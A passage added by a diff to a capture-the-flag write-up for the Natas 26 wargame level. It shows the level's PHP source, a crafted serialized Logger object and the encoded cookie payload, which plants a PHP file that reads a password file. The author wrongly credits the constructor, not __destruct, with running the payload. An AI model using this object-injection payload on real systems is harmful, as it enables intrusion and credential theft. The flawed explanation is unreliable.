@@ -2467,3 +2467,261 @@ THAT is one heck of a cURL command. Should work, though. Let's try it.
 ~~~~
 
 Heck yeah! We did it! That was definitely a challenging one. If they had only properly prevented directory traversal, they might've succeeded in foiling attackers.
+
+
+## Natas 26 🡆 Natas 27
+
+
+___
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form> 
+
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+___
+
+Line-drawing. Fun! But how do we hack it? Source time.
+
+~~~~
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas26", "pass": "<censored>" };</script></head>
+<body>
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+    
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+      
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }                       
+      
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }                       
+      
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+    }
+ 
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);     
+        imagedestroy($img);
+    }
+    
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+        
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"], 
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+        
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) && 
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) && 
+                        array_key_exists("y2", $object)){
+                    
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+            
+                    }
+        }    
+    }
+    
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+        
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+        
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form> 
+
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
+        $imgfile="img/natas26_" . session_id() .".png"; 
+        drawImage($imgfile); 
+        showImage($imgfile);
+        storeData();
+    }
+    
+?>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+~~~~
+
+
+That's a bit of a mouthful. And... what the heck? We've got this big ol' `Logger` class up top that's never even being called. I think it's about time Kaliman and Morla sit down for a code review.
+
+Anywho, let's continue down to the stuff that actually *is* being used. Scanning through, trying to find somewhere vulnerable... and, woah! Holy cow, look at this!
+
+~~~~
+if (array_key_exists("drawing", $_COOKIE)){
+    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+    if($drawing)
+        foreach($drawing as $object)
+            if( array_key_exists("x1", $object) && 
+                array_key_exists("y1", $object) &&
+                array_key_exists("x2", $object) && 
+                array_key_exists("y2", $object)){
+            
+                $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                imageline($img,$object["x1"],$object["y1"],
+                        $object["x2"] ,$object["y2"] ,$color);
+    
+            }
+}
+~~~~
+
+Hold on, hold on, hold on... They're taking the "drawing" cookie without filtering and turning it into an *object*?! ***Why?!?!***
+
+Dang, Morla, this *is* ugly as hell.
+
+So... Almost-criminally-negligent practices aside, let's think of how we can use this. Objects have `__constructor` functions that run when they're instantiated, and since we have full control over the object this script instantiates, we can make that `__constructor` do anything we want it to. Let's say, something like:
+
+~~~~
+<?php
+
+class Logger
+{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct($file)
+    {
+        $this->initMsg = "Hakked";
+        $this->exitMsg = "Natas27 Password: <?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "img/totally_not_a_trojan.php";
+    }
+}
+
+?>
+~~~~
+
+This way, we can tap into that unused `Logger` class Morla so nicely left for us up there. We'll just overwrite that `exitMsg` with a call to read `/etc/natas_webpass/natas27`, and throw that "logfile" into a PHP script in the `img` directory... a directory we have access to, and should be able to run it from.
+
+Oh, one quick caveat: it's expecting a serialized, base64_encoded representation of this object, so let's throw a couple more lines in here for ease of use:
+
+~~~~
+$obj = new Logger("hax");
+
+file_put_contents("hackityhackhack.txt", urlencode(base64_encode(serialize($obj))));
+~~~~
+
+There, that should do it. I chose to use a file rather than stdout because newline characters are a pain.
+
+Run it, and here's our object:
+
+~~~~
+Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyODoiaW1nL3RvdGFsbHlfbm90X2FfdHJvamFuLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjY6Ikhha2tlZCI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjgwOiJOYXRhczI3IFBhc3N3b3JkOiA8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPiI7fQ%3D%3D
+~~~~
+
+Cool! Throw that in our `drawing` cookie, and let's get 'sploiting.
+
+___
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form> 
+
+<img src="https://i.imgur.com/BGjB1Hh.png"><br />
+<b>Fatal error</b>:  Cannot use object of type Logger as array in <b>/var/www/natas/natas26/index.php</b> on line <b>105</b><br />
+
+___
+
+Haha, darn right you can't use object of type Logger as array. But we don't care, because Logger got instantiated, and that means we should have a little something waiting for us at `http://natas26.natas.labs.overthewire.org/img/totally_not_a_trojan.php`!
+
+Drum roll, please...
+
+`Natas27 Password: [censored]`
+
+
+## Natas 27 🡆 Natas 28
+
+
